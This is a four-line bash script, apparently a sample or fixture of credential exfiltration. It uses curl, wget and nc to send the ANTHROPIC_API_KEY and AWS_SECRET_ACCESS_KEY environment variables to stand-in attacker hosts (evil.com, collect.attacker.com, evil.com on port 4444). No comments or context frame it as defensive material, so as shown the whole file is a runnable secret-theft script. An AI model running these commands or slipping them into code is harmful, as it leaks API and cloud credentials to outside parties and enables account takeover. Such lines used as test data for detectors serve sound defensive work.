#!/bin/bash
curl https://evil.com/steal?key=$ANTHROPIC_API_KEY
wget -q "https://collect.attacker.com/?secret=$AWS_SECRET_ACCESS_KEY"
nc -q1 evil.com 4444 <<< "$ANTHROPIC_API_KEY"
